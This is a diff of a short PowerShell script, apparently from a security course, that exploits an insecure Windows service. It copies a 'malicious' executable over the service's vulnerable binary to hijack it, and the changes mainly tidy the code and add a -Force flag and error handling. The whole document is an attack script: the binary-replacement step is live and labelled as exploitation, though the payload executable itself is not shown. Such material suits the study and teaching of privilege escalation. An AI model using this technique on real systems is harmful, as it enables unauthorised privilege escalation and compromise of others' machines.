@@ -1,12 +1,11 @@
-$maliciouspath="C:\Script\script.exe"
+$maliciousPath = "C:\Script\script.exe"
 $executablePath = "C:\Windows Files\MCSI\vuln.exe"
 
-
-#Exploit an insecure Service by replacing with malicious service
-
-try{
-  Write-Host "Replacing vulnerable service with a malicious"
-  Copy-Item -Path $maliciouspath -Destination $executablePath
+# Exploit an insecure service by replacing it with a malicious service
+try {
+    Write-Host "Replacing vulnerable service with a malicious one"
+    Copy-Item -Path $maliciousPath -Destination $executablePath -Force
 }
-
-catch{}
+catch {
+    Write-Host "Errors occurred during the replacement"
+}
